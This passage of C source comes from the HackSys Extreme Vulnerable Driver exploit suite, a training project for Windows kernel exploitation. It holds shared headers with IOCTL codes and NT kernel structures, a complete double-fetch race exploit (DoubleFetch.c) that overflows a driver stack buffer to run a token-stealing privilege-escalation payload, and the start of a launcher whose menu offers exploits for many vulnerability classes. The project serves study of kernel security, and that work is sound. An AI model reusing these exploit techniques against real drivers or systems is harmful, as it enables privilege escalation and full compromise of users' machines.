    #define DEBUG_ERROR(fmt, ...) do { ColoredConsoleOuput(FOREGROUND_RED, fmt, ##__VA_ARGS__); } while (0)
    #define DEBUG_SUCCESS(fmt, ...) do { ColoredConsoleOuput(FOREGROUND_GREEN, fmt, ##__VA_ARGS__); } while (0)
    #define DEBUG_MESSAGE(fmt, ...) do { ColoredConsoleOuput(FOREGROUND_RED | FOREGROUND_BLUE | FOREGROUND_GREEN, fmt, ##__VA_ARGS__); } while (0)

    #define HACKSYS_EVD_IOCTL_STACK_OVERFLOW                  CTL_CODE(FILE_DEVICE_UNKNOWN, 0x800, METHOD_NEITHER, FILE_ANY_ACCESS)
    #define HACKSYS_EVD_IOCTL_STACK_OVERFLOW_GS               CTL_CODE(FILE_DEVICE_UNKNOWN, 0x801, METHOD_NEITHER, FILE_ANY_ACCESS)
    #define HACKSYS_EVD_IOCTL_ARBITRARY_OVERWRITE             CTL_CODE(FILE_DEVICE_UNKNOWN, 0x802, METHOD_NEITHER, FILE_ANY_ACCESS)
    #define HACKSYS_EVD_IOCTL_POOL_OVERFLOW                   CTL_CODE(FILE_DEVICE_UNKNOWN, 0x803, METHOD_NEITHER, FILE_ANY_ACCESS)
    #define HACKSYS_EVD_IOCTL_ALLOCATE_UAF_OBJECT             CTL_CODE(FILE_DEVICE_UNKNOWN, 0x804, METHOD_NEITHER, FILE_ANY_ACCESS)
    #define HACKSYS_EVD_IOCTL_USE_UAF_OBJECT                  CTL_CODE(FILE_DEVICE_UNKNOWN, 0x805, METHOD_NEITHER, FILE_ANY_ACCESS)
    #define HACKSYS_EVD_IOCTL_FREE_UAF_OBJECT                 CTL_CODE(FILE_DEVICE_UNKNOWN, 0x806, METHOD_NEITHER, FILE_ANY_ACCESS)
    #define HACKSYS_EVD_IOCTL_ALLOCATE_FAKE_OBJECT            CTL_CODE(FILE_DEVICE_UNKNOWN, 0x807, METHOD_NEITHER, FILE_ANY_ACCESS)
    #define HACKSYS_EVD_IOCTL_TYPE_CONFUSION                  CTL_CODE(FILE_DEVICE_UNKNOWN, 0x808, METHOD_NEITHER, FILE_ANY_ACCESS)
    #define HACKSYS_EVD_IOCTL_INTEGER_OVERFLOW                CTL_CODE(FILE_DEVICE_UNKNOWN, 0x809, METHOD_NEITHER, FILE_ANY_ACCESS)
    #define HACKSYS_EVD_IOCTL_NULL_POINTER_DEREFERENCE        CTL_CODE(FILE_DEVICE_UNKNOWN, 0x80A, METHOD_NEITHER, FILE_ANY_ACCESS)
    #define HACKSYS_EVD_IOCTL_UNINITIALIZED_STACK_VARIABLE    CTL_CODE(FILE_DEVICE_UNKNOWN, 0x80B, METHOD_NEITHER, FILE_ANY_ACCESS)
    #define HACKSYS_EVD_IOCTL_UNINITIALIZED_HEAP_VARIABLE     CTL_CODE(FILE_DEVICE_UNKNOWN, 0x80C, METHOD_NEITHER, FILE_ANY_ACCESS)
    #define HACKSYS_EVD_IOCTL_DOUBLE_FETCH                    CTL_CODE(FILE_DEVICE_UNKNOWN, 0x80D, METHOD_NEITHER, FILE_ANY_ACCESS)
    #define HACKSYS_EVD_IOCTL_INSECURE_KERNEL_FILE_ACCESS     CTL_CODE(FILE_DEVICE_UNKNOWN, 0x80E, METHOD_NEITHER, FILE_ANY_ACCESS)

    typedef time_t TIME;

    typedef struct _CLIENT_ID {
        PVOID UniqueProcess;
        PVOID UniqueThread;
    } CLIENT_ID, *PCLIENT_ID;

    typedef struct _LSA_UNICODE_STRING {
        USHORT Length;
        USHORT MaximumLength;
        PWSTR  Buffer;
    } LSA_UNICODE_STRING, *PLSA_UNICODE_STRING, UNICODE_STRING, *PUNICODE_STRING;

    typedef struct _OBJECT_ATTRIBUTES {
        ULONG           Length;
        HANDLE          RootDirectory;
        PUNICODE_STRING ObjectName;
        ULONG           Attributes;
        PVOID           SecurityDescriptor;
        PVOID           SecurityQualityOfService;
    } OBJECT_ATTRIBUTES, *POBJECT_ATTRIBUTES;

    typedef struct _SYSTEM_MODULE_INFORMATION_ENTRY {
        PVOID  Unknown1;
        PVOID  Unknown2;
        PVOID  Base;
        ULONG  Size;
        ULONG  Flags;
        USHORT Index;
        USHORT NameLength;
        USHORT LoadCount;
        USHORT PathLength;
        CHAR   ImageName[256];
    } SYSTEM_MODULE_INFORMATION_ENTRY, *PSYSTEM_MODULE_INFORMATION_ENTRY;

    typedef struct _SYSTEM_MODULE_INFORMATION {
        ULONG   Count;
        SYSTEM_MODULE_INFORMATION_ENTRY Module[1];
    } SYSTEM_MODULE_INFORMATION, *PSYSTEM_MODULE_INFORMATION;

    typedef enum _SYSTEM_INFORMATION_CLASS { 
        SystemModuleInformation = 11,
        SystemHandleInformation = 16
    } SYSTEM_INFORMATION_CLASS;

    typedef enum _PROCESSINFOCLASS {
        ProcessBasicInformation,
        ProcessQuotaLimits,
        ProcessIoCounters,
        ProcessVmCounters,
        ProcessTimes,
        ProcessBasePriority,
        ProcessRaisePriority,
        ProcessDebugPort,
        ProcessExceptionPort,
        ProcessAccessToken,
        ProcessLdtInformation,
        ProcessLdtSize,
        ProcessDefaultHardErrorMode,
        ProcessIoPortHandlers,
        ProcessPooledUsageAndLimits,
        ProcessWorkingSetWatch,
        ProcessUserModeIOPL,
        ProcessEnableAlignmentFaultFixup,
        ProcessPriorityClass,
        ProcessWx86Information,
        ProcessHandleCount,
        ProcessAffinityMask,
        ProcessPriorityBoost,
        ProcessDeviceMap,
        ProcessSessionInformation,
        ProcessForegroundInformation,
        ProcessWow64Information,
        ProcessImageFileName,
        ProcessLUIDDeviceMapsEnabled,
        ProcessBreakOnTermination,
        ProcessDebugObjectHandle,
        ProcessDebugFlags,
        ProcessHandleTracing,
        ProcessIoPriority,
        ProcessExecuteFlags,
        ProcessTlsInformation,
        ProcessCookie,
        ProcessImageInformation,
        ProcessCycleTime,
        ProcessPagePriority,
        ProcessInstrumentationCallback,
        ProcessThreadStackAllocation,
        ProcessWorkingSetWatchEx,
        ProcessImageFileNameWin32,
        ProcessImageFileMapping,
        ProcessAffinityUpdateMode,
        ProcessMemoryAllocationMode,
        ProcessGroupInformation,
        ProcessTokenVirtualizationEnabled,
        ProcessConsoleHostProcess,
        ProcessWindowInformation,
        MaxProcessInfoClass
    } PROCESSINFOCLASS;

    typedef struct _PROCESS_ACCESS_TOKEN {
        HANDLE Token;
        HANDLE Thread;
    } PROCESS_ACCESS_TOKEN, *PPROCESS_ACCESS_TOKEN;

    typedef struct _EPROCESS {
        UCHAR NotNeeded1[0x26C];
        union {
            ULONG Flags2;
            struct {
                ULONG JobNotReallyActive: 1;
                ULONG AccountingFolded: 1;
                ULONG NewProcessReported: 1;
                ULONG ExitProcessReported: 1;
                ULONG ReportCommitChanges: 1;
                ULONG LastReportMemory: 1;
                ULONG ReportPhysicalPageChanges: 1;
                ULONG HandleTableRundown: 1;
                ULONG NeedsHandleRundown: 1;
                ULONG RefTraceEnabled: 1;
                ULONG NumaAware: 1;
                ULONG ProtectedProcess: 1;
                ULONG DefaultPagePriority: 3;
                ULONG PrimaryTokenFrozen: 1;
                ULONG ProcessVerifierTarget: 1;
                ULONG StackRandomizationDisabled: 1;
                ULONG AffinityPermanent: 1;
                ULONG AffinityUpdateEnable: 1;
                ULONG PropagateNode: 1;
                ULONG ExplicitAffinity: 1;
            };
        };
        UCHAR NotNeeded2[0x50];
    } EPROCESS, *PEPROCESS;

    typedef struct _PROCESS_DEVICEMAP_INFORMATION {
        HANDLE DirectoryHandle;
    } PROCESS_DEVICEMAP_INFORMATION, *PPROCESS_DEVICEMAP_INFORMATION;

    typedef NTSTATUS (WINAPI *ZwClose_t)(IN HANDLE hObject);

    typedef PEPROCESS (WINAPI *PsGetCurrentProcess_t)(VOID);

    typedef PACCESS_TOKEN (WINAPI *PsReferencePrimaryToken_t)(IN OUT PVOID Process);

    typedef NTSTATUS (WINAPI *NtQueryIntervalProfile_t)(IN ULONG   ProfileSource,
                                                        OUT PULONG Interval);

    typedef NTSTATUS (WINAPI *ZwOpenProcessToken_t)(IN HANDLE      ProcessHandle,
                                                    IN ACCESS_MASK DesiredAccess,
                                                    OUT PHANDLE    TokenHandle);

    typedef NTSTATUS (WINAPI *PsLookupProcessByProcessId_t)(IN HANDLE ProcessId,
                                                            OUT PVOID Process);

    typedef NTSTATUS (WINAPI *ZwSetInformationProcess_t)(IN HANDLE ProcessHandle,
                                                         IN ULONG  ProcessInformationClass,
                                                         IN PVOID  ProcessInformation,
                                                         IN ULONG  ProcessInformationLength);

    typedef NTSTATUS (WINAPI *ZwOpenProcess_t)(OUT PHANDLE           ProcessHandle,
                                               IN ACCESS_MASK        DesiredAccess,
                                               IN POBJECT_ATTRIBUTES ObjectAttributes,
                                               IN PCLIENT_ID         ClientId OPTIONAL);

    typedef NTSTATUS (WINAPI *NtAllocateVirtualMemory_t)(IN HANDLE     ProcessHandle,
                                                         IN OUT PVOID  *BaseAddress,
                                                         IN ULONG      ZeroBits,
                                                         IN OUT PULONG AllocationSize,
                                                         IN ULONG      AllocationType,
                                                         IN ULONG      Protect);

    typedef NTSTATUS (WINAPI *NtAllocateReserveObject_t)(OUT PHANDLE           hObject,
                                                         IN POBJECT_ATTRIBUTES ObjectAttributes,
                                                         IN DWORD              ObjectType);

    typedef NTSTATUS (WINAPI *NtMapUserPhysicalPages_t)(IN PVOID          VirtualAddress,
                                                        IN ULONG_PTR      NumberOfPages,
                                                        IN OUT PULONG_PTR UserPfnArray);

    typedef NTSTATUS (WINAPI *ZwDuplicateToken_t)(IN HANDLE             ExistingTokenHandle,
                                                  IN ACCESS_MASK        DesiredAccess,
                                                  IN POBJECT_ATTRIBUTES ObjectAttributes,
                                                  IN BOOLEAN            EffectiveOnly,
                                                  IN TOKEN_TYPE         TokenType,
                                                  OUT PHANDLE           NewTokenHandle);

    typedef NTSTATUS (WINAPI *NtQuerySystemInformation_t)(IN SYSTEM_INFORMATION_CLASS SystemInformationClass,
                                                          OUT PVOID                   SystemInformation,
                                                          IN ULONG                    SystemInformationLength,
                                                          OUT PULONG                  ReturnLength);


    typedef NTSTATUS (WINAPI *NtSetInformationProcess_t)(IN HANDLE           ProcessHandle,
                                                         IN PROCESSINFOCLASS ProcessInformationClass,
                                                         IN PVOID            ProcessInformation,
                                                         IN ULONG            ProcessInformationLength);

    typedef NTSTATUS (WINAPI *NtCreateDirectoryObject_t)(OUT PHANDLE           DirectoryHandle,
                                                         IN ACCESS_MASK        DesiredAccess,
                                                         IN POBJECT_ATTRIBUTES ObjectAttributes);

    typedef NTSTATUS (WINAPI *NtOpenDirectoryObject_t)(OUT PHANDLE           DirectoryHandle,
                                                       IN ACCESS_MASK        DesiredAccess,
                                                       IN POBJECT_ATTRIBUTES ObjectAttributes);

    typedef VOID (WINAPI *RtlInitUnicodeString_t)(IN OUT PUNICODE_STRING DestinationString,
                                                  IN PCWSTR              SourceString OPTIONAL);

    typedef NTSTATUS (WINAPI *NtCreateSymbolicLinkObject_t)(OUT PHANDLE           SymbolicLinkHandle,
                                                            IN ACCESS_MASK        DesiredAccess,
                                                            IN POBJECT_ATTRIBUTES ObjectAttributes,
                                                            IN PUNICODE_STRING    TargetName);

    ZwClose_t                     ZwClose;
    ZwOpenProcess_t               ZwOpenProcess;
    ZwDuplicateToken_t            ZwDuplicateToken;
    ZwOpenProcessToken_t          ZwOpenProcessToken;
    PsGetCurrentProcess_t         PsGetCurrentProcess;
    RtlInitUnicodeString_t        RtlInitUnicodeString;
    NtOpenDirectoryObject_t       NtOpenDirectoryObject;
    NtMapUserPhysicalPages_t      NtMapUserPhysicalPages;
    NtQueryIntervalProfile_t      NtQueryIntervalProfile;
    NtSetInformationProcess_t     NtSetInformationProcess;
    ZwSetInformationProcess_t     ZwSetInformationProcess;
    NtAllocateReserveObject_t     NtAllocateReserveObject;
    NtAllocateVirtualMemory_t     NtAllocateVirtualMemory;
    NtCreateDirectoryObject_t     NtCreateDirectoryObject;
    PsReferencePrimaryToken_t     PsReferencePrimaryToken;
    NtQuerySystemInformation_t    NtQuerySystemInformation;
    PsLookupProcessByProcessId_t  PsLookupProcessByProcessId;
    NtCreateSymbolicLinkObject_t  NtCreateSymbolicLinkObject;

    BOOL ExploitSuccessful;

    BOOL      MapNullPage();
    VOID      ClearScreen();
    VOID      ResolveKernelAPIs();
    VOID      CenterConsoleScreen();
    PVOID     GetHalDispatchTable();
    ULONG     GetNumberOfProcessors();
    DWORD     GetProcessID(LPCSTR ProcessName);
    HANDLE    GetDeviceHandle(LPCSTR FileName);
    VOID      ColoredConsoleOuput(WORD wColor, CONST PTCHAR fmt, ...);

#endif //__COMMON_H__

```

`Exploit/DoubleFetch.c`:

```c
/*++

          ##     ## ######## ##     ## ########  
          ##     ## ##       ##     ## ##     ## 
          ##     ## ##       ##     ## ##     ## 
          ######### ######   ##     ## ##     ## 
          ##     ## ##        ##   ##  ##     ## 
          ##     ## ##         ## ##   ##     ## 
          ##     ## ########    ###    ########  

        HackSys Extreme Vulnerable Driver Exploit

Author : Ashfaq Ansari
Contact: ashfaq[at]hacksys[dot]io
Website: https://hacksys.io/

Copyright (C) 2021-2023 HackSys Inc. All rights reserved.
Copyright (C) 2015-2020 Payatu Software Labs LLP. All rights reserved.

This program is free software: you can redistribute it and/or modify it under the terms of
the GNU General Public License as published by the Free Software Foundation, either version
3 of the License, or (at your option) any later version.

This program is distributed in the hope that it will be useful, but WITHOUT ANY WARRANTY;
without even the implied warranty of MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.
See the GNU General Public License for more details.

You should have received a copy of the GNU General Public License along with this program.
If not, see <http://www.gnu.org/licenses/>.

THIS SOFTWARE IS PROVIDED "AS IS" AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT
LIMITED TO, THE IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE
ARE DISCLAIMED.  IN NO EVENT SHALL THE AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY DIRECT,
INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT LIMITED
TO, PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS
INTERRUPTION) HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT
LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF
THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.

See the file 'LICENSE' for complete copying permission.

Module Name:
    DoubleFetch.c

Abstract:
    This module implements the exploit for Double Fetch Vulnerability
    implemented in HackSys Extreme Vulnerable Driver.

References:
    http://j00ru.vexillium.org/?p=1880

--*/

#include "DoubleFetch.h"

DWORD WINAPI FlippingThread(LPVOID Parameter) {
    DEBUG_INFO("\t\t\t[+] FlippingThread Scheduled On Processor: %d\n", GetCurrentProcessorNumber());

    while (!ExploitSuccessful) {
        *(PULONG)Parameter ^= 0x00000A24;
    }

    return EXIT_SUCCESS;
}

DWORD WINAPI RacingThread(LPVOID Parameter) {
    HANDLE hFile = NULL;
    ULONG BytesReturned;
    BOOL Success = FALSE;
    HANDLE hThread = NULL;
    PDOUBLE_FETCH UserDoubleFetch = NULL;
    PRACING_THREAD_PARAMETER RacingThreadParameter = NULL;

    RacingThreadParameter = (PRACING_THREAD_PARAMETER)Parameter;

    hFile = RacingThreadParameter->DeviceHandle;
    UserDoubleFetch = RacingThreadParameter->DoubleFetch;

    DEBUG_INFO("\t\t\t[+] RacingThread Scheduled On Processor: %d\n", GetCurrentProcessorNumber());

    OutputDebugString("****************Kernel Mode****************\n");

    while (!ExploitSuccessful) {
        // It's best to flush TLB Cache in Racing Thread
        EmptyWorkingSet(GetCurrentProcess());

        Success = DeviceIoControl(hFile,
                                  HACKSYS_EVD_IOCTL_DOUBLE_FETCH,
                                  (LPVOID)UserDoubleFetch,
                                  0,
                                  NULL,
                                  0,
                                  &BytesReturned,
                                  NULL);
    }

    OutputDebugString("****************Kernel Mode****************\n");

    return EXIT_SUCCESS;
}

DWORD WINAPI DoubleFetchThread(LPVOID Parameter) {
    UINT32 i = 0;
    DWORD_PTR Mask = 0;
    HANDLE hFile = NULL;
    BOOL SingleCPU = FALSE;
    PVOID MemoryAddress = NULL;
    DWORD ThreadTimeout = 120000;
    PULONG UserModeBuffer = NULL;
    ULONG NumberOfProcessors = 0;
    PDOUBLE_FETCH UserDoubleFetch = NULL;
    LPCSTR FileName = (LPCSTR)DEVICE_NAME;
    PVOID EopPayload = &TokenStealingPayloadWin7New;
    HANDLE RacingThreads[MAXIMUM_THREADS_ALLOWED] = {0};
    HANDLE FlippingThreads[MAXIMUM_THREADS_ALLOWED] = {0};
    PRACING_THREAD_PARAMETER RacingThreadParameter = NULL;
    SIZE_T UserModeBufferSize = (BUFFER_SIZE + RET_OVERWRITE) * sizeof(ULONG);

    __try {
        // Get the device handle
        DEBUG_MESSAGE("\t[+] Getting Device Driver Handle\n");
        DEBUG_INFO("\t\t[+] Device Name: %s\n", FileName);

        hFile = GetDeviceHandle(FileName);

        if (hFile == INVALID_HANDLE_VALUE) {
            DEBUG_ERROR("\t\t[-] Failed Getting Device Handle: 0x%X\n", GetLastError());
            exit(EXIT_FAILURE);
        }
        else {
            DEBUG_INFO("\t\t[+] Device Handle: 0x%X\n", hFile);
        }

        DEBUG_MESSAGE("\t[+] Setting Up Vulnerability Stage\n");

        DEBUG_INFO("\t\t[+] Getting Processor Details\n");

        // Find number of processors
        NumberOfProcessors = GetNumberOfProcessors();

        DEBUG_INFO("\t\t\t[+] Number Of Processors: %d\n", NumberOfProcessors);

        if (NumberOfProcessors < 2) {
            SingleCPU = TRUE;

            DEBUG_ERROR("\t\t\t[+] Winning Race With 1 Core Is Hard\n");
        }

        DEBUG_INFO("\t\t[+] Allocating Memory For Buffer\n");

        // Allocate the memory for RACING_THREAD_PARAMETER
        RacingThreadParameter = (PRACING_THREAD_PARAMETER)HeapAlloc(GetProcessHeap(),
                                                                    HEAP_ZERO_MEMORY,
                                                                    sizeof(RACING_THREAD_PARAMETER));

        if (!RacingThreadParameter) {
            DEBUG_ERROR("\t\t\t[-] Failed To Allocate Memory: 0x%X\n", GetLastError());
            exit(EXIT_FAILURE);
        }

        // Allocate the memory for DOUBLE_FETCH as PAGE_NOCACHE
        UserDoubleFetch = (PDOUBLE_FETCH)VirtualAlloc(NULL,
                                                      0x1000,
                                                      MEM_RESERVE | MEM_COMMIT,
                                                      PAGE_READWRITE | PAGE_NOCACHE);

        if (!UserDoubleFetch) {
            DEBUG_ERROR("\t\t\t[-] Failed To Allocate Memory: 0x%X\n", GetLastError());
            exit(EXIT_FAILURE);
        }

        UserModeBuffer = (PULONG)HeapAlloc(GetProcessHeap(),
                                           HEAP_ZERO_MEMORY,
                                           UserModeBufferSize);

        if (!UserModeBuffer) {
            DEBUG_ERROR("\t\t\t[-] Failed To Allocate Memory: 0x%X\n", GetLastError());
            exit(EXIT_FAILURE);
        }

        UserDoubleFetch->Buffer = UserModeBuffer;
        UserDoubleFetch->Size = (SIZE_T)BUFFER_SIZE;

        DEBUG_INFO("\t\t\t[+] UserModeBuffer: 0x%p\n", UserModeBuffer);
        DEBUG_INFO("\t\t\t[+] UserModeBuffer Size: 0x%X\n", UserModeBufferSize);
        DEBUG_INFO("\t\t\t[+] UserDoubleFetch: 0x%p\n", UserDoubleFetch);
        DEBUG_INFO("\t\t\t[+] UserDoubleFetch->Buffer: 0x%p\n", UserDoubleFetch->Buffer);
        DEBUG_INFO("\t\t\t[+] UserDoubleFetch->Size: 0x%X\n", UserDoubleFetch->Size);

        DEBUG_INFO("\t\t[+] Preparing Buffer Memory Layout\n");

        RtlFillMemory((PVOID)UserModeBuffer, UserModeBufferSize, 0x41);

        MemoryAddress = (PVOID)(((ULONG)UserModeBuffer + UserModeBufferSize) - sizeof(ULONG));
        *(PULONG)MemoryAddress = (ULONG)EopPayload;

        DEBUG_INFO("\t\t\t[+] RET Value: 0x%p\n", *(PULONG)MemoryAddress);
        DEBUG_INFO("\t\t\t[+] RET Address: 0x%p\n", MemoryAddress);

        DEBUG_INFO("\t\t[+] EoP Payload: 0x%p\n", EopPayload);

        RacingThreadParameter->DeviceHandle = hFile;
        RacingThreadParameter->DoubleFetch = UserDoubleFetch;

        ExploitSuccessful = FALSE;

        DEBUG_MESSAGE("\t[+] Starting Threads\n");

        for (i = 0; i < NumberOfProcessors; i++) {
            DEBUG_INFO("\t\t[+] Starting Racing Thread: %d\n", i);
            RacingThreads[i] = CreateThread(NULL, 0, RacingThread, RacingThreadParameter, CREATE_SUSPENDED, 0);
            SetThreadPriority(RacingThreads[i], THREAD_PRIORITY_HIGHEST);

            DEBUG_INFO("\t\t[+] Starting Flipping Thread: %d\n", i);
            FlippingThreads[i] = CreateThread(NULL, 0, FlippingThread, &UserDoubleFetch->Size, CREATE_SUSPENDED, 0);
            SetThreadPriority(FlippingThreads[i], THREAD_PRIORITY_HIGHEST);

            if (!SingleCPU) {
                Mask |= 1 << i;
                SetThreadAffinityMask(RacingThreads[i], Mask);

                Mask |= 1 << (i + 1);
                SetThreadAffinityMask(FlippingThreads[i], Mask);
            }
            else {
                SetThreadAffinityMask(RacingThreads[i], Mask);
                SetThreadAffinityMask(FlippingThreads[i], Mask);
            }

            ResumeThread(RacingThreads[i]);
            ResumeThread(FlippingThreads[i]);
        }

        if (WaitForMultipleObjects(NumberOfProcessors, RacingThreads, TRUE, ThreadTimeout)) {
            // Terminate the threads
            for (i = 0; i < NumberOfProcessors; i++) {
                TerminateThread(RacingThreads[i], EXIT_SUCCESS);
                CloseHandle(RacingThreads[i]);

                TerminateThread(FlippingThreads[i], EXIT_SUCCESS);
                CloseHandle(FlippingThreads[i]);
            }

            DEBUG_INFO("\t\t[+] Terminated Exploit Threads\n");
        }

        VirtualFree(UserDoubleFetch, 0, MEM_RELEASE);
        HeapFree(GetProcessHeap(), 0, (LPVOID)UserModeBuffer);
        HeapFree(GetProcessHeap(), 0, (LPVOID)RacingThreadParameter);

        UserModeBuffer = NULL;
        UserDoubleFetch = NULL;
        RacingThreadParameter = NULL;
    }
    __except (EXCEPTION_EXECUTE_HANDLER) {
        DEBUG_ERROR("\t\t[-] Exception: 0x%X\n", GetLastError());
        exit(EXIT_FAILURE);
    }

    return EXIT_SUCCESS;
}

```

`Exploit/DoubleFetch.h`:

```h
/*++

          ##     ## ######## ##     ## ########  
          ##     ## ##       ##     ## ##     ## 
          ##     ## ##       ##     ## ##     ## 
          ######### ######   ##     ## ##     ## 
          ##     ## ##        ##   ##  ##     ## 
          ##     ## ##         ## ##   ##     ## 
          ##     ## ########    ###    ########  

        HackSys Extreme Vulnerable Driver Exploit

Author : Ashfaq Ansari
Contact: ashfaq[at]hacksys[dot]io
Website: https://hacksys.io/

Copyright (C) 2021-2023 HackSys Inc. All rights reserved.
Copyright (C) 2015-2020 Payatu Software Labs LLP. All rights reserved.

This program is free software: you can redistribute it and/or modify it under the terms of
the GNU General Public License as published by the Free Software Foundation, either version
3 of the License, or (at your option) any later version.

This program is distributed in the hope that it will be useful, but WITHOUT ANY WARRANTY;
without even the implied warranty of MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.
See the GNU General Public License for more details.

You should have received a copy of the GNU General Public License along with this program.
If not, see <http://www.gnu.org/licenses/>.

THIS SOFTWARE IS PROVIDED "AS IS" AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT
LIMITED TO, THE IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE
ARE DISCLAIMED.  IN NO EVENT SHALL THE AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY DIRECT,
INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT LIMITED
TO, PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS
INTERRUPTION) HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT
LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF
THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.

See the file 'LICENSE' for complete copying permission.

Module Name:
    DoubleFetch.h

Abstract:
    This module implements the data structures used by the
    exploit for Double Fetch Vulnerability implemented in
    HackSys Extreme Vulnerable Driver.

--*/

#ifndef __DOUBLE_FETCH_H__
    #define __DOUBLE_FETCH_H__

    #pragma once

    #include "Common.h"

    #pragma comment(lib, "psapi.lib")

    #define MAXIMUM_THREADS_ALLOWED 100

    typedef struct _DOUBLE_FETCH {
        PVOID Buffer;
        SIZE_T Size;
    } DOUBLE_FETCH, *PDOUBLE_FETCH;

    typedef struct _RACING_THREAD_PARAMETER {
        HANDLE        DeviceHandle;
        PDOUBLE_FETCH DoubleFetch;
    } RACING_THREAD_PARAMETER, *PRACING_THREAD_PARAMETER;

    DWORD WINAPI    DoubleFetchThread(LPVOID Parameter);

#endif  //__DOUBLE_FETCH_H__

```

`Exploit/HackSysEVDExploit.c`:

```c
/*++

          ##     ## ######## ##     ## ########  
          ##     ## ##       ##     ## ##     ## 
          ##     ## ##       ##     ## ##     ## 
          ######### ######   ##     ## ##     ## 
          ##     ## ##        ##   ##  ##     ## 
          ##     ## ##         ## ##   ##     ## 
          ##     ## ########    ###    ########  

        HackSys Extreme Vulnerable Driver Exploit

Author : Ashfaq Ansari
Contact: ashfaq[at]hacksys[dot]io
Website: https://hacksys.io/

Copyright (C) 2021-2023 HackSys Inc. All rights reserved.
Copyright (C) 2015-2020 Payatu Software Labs LLP. All rights reserved.

This program is free software: you can redistribute it and/or modify it under the terms of
the GNU General Public License as published by the Free Software Foundation, either version
3 of the License, or (at your option) any later version.

This program is distributed in the hope that it will be useful, but WITHOUT ANY WARRANTY;
without even the implied warranty of MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.
See the GNU General Public License for more details.

You should have received a copy of the GNU General Public License along with this program.
If not, see <http://www.gnu.org/licenses/>.

THIS SOFTWARE IS PROVIDED "AS IS" AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT
LIMITED TO, THE IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE
ARE DISCLAIMED.  IN NO EVENT SHALL THE AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY DIRECT,
INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT LIMITED
TO, PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS
INTERRUPTION) HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT
LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF
THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.

See the file 'LICENSE' for complete copying permission.

Module Name:
    HackSysEVDExploit.c

Abstract:
    This module implements the main routines to invoke 
    exploit for respective vulnerabilities.

--*/

#include "HackSysEVDExploit.h"

CHAR *argv0;

static VOID ShowUsage(PTCHAR Process) {
    DEBUG_ERROR("                                             \n"
                " Usage: %s [option] -c [process to launch]   \n"
                "                                             \n"
                "        %s -a -c cmd.exe                     \n"
                "                                             \n"
                "        [option]                             \n"
                "            -d : Double Fetch                \n"
                "            -p : Pool Overflow               \n"
                "            -s : Stack Overflow              \n"
                "            -u : Use After Free              \n"
                "            -t : Type Confusion              \n"
                "            -i : Integer Overflow            \n"
                "            -g : Stack Overflow GS           \n"
                "            -n : Null Pointer Dereference    \n"
                "            -a : Arbitrary Memory Overwrite  \n"
                "            -f : Insecure Kernel File Access \n"
                "            -h : Uninitialized Heap Variable \n"
                "            -v : Uninitialized Stack Variable\n"
                "                                             \n", Process, Process);
    exit(EXIT_FAILURE);
}

VOID LaunchExploitThread(LPTHREAD_START_ROUTINE ExploitHandlerThread) {
    DWORD_PTR Mask = 0;
    HANDLE hThread = NULL;
    DWORD ThreadTimeout = 0x50000;

    // Create a new thread
    DEBUG_MESSAGE("\t[+] Creating The Exploit Thread\n");
    hThread = CreateThread(NULL, 0, ExploitHandlerThread, NULL, CREATE_SUSPENDED, 0);

    if (!hThread) {
        DEBUG_ERROR("\t\t[-] Failed To Create Exploit Thread: 0x%X\n", GetLastError());
        exit(EXIT_FAILURE);
    }

    DEBUG_INFO("\t\t[+] Exploit Thread Handle: 0x%X\n", hThread);

    SetThreadPriority(hThread, THREAD_PRIORITY_HIGHEST);
    SetThreadAffinityMask(hThread, Mask);

    ResumeThread(hThread);

    if (WaitForSingleObject(hThread, ThreadTimeout)) {
        // Terminate the thread
        TerminateThread(hThread, EXIT_FAILURE);
        DEBUG_INFO("\t\t[+] Terminated Exploit Thread: 0x%X\n", hThread);
    }

    CloseHandle(hThread);
}

BOOL IsProcessHavingHigherPrivilege(LPCSTR TargetProcess) {
    DWORD ProcessID = 0;
    HANDLE hProcess = NULL;
    BOOL IsHighPrivileged = FALSE;

    DEBUG_MESSAGE("\t[+] Trying To Get Process ID Of: %s\n", TargetProcess);

    ProcessID = GetProcessID(TargetProcess);

    if (!ProcessID) {
        DEBUG_ERROR("\t\t[-] Failed To Get Process ID Of: %s\n", TargetProcess);
        exit(EXIT_FAILURE);
    }
    else {
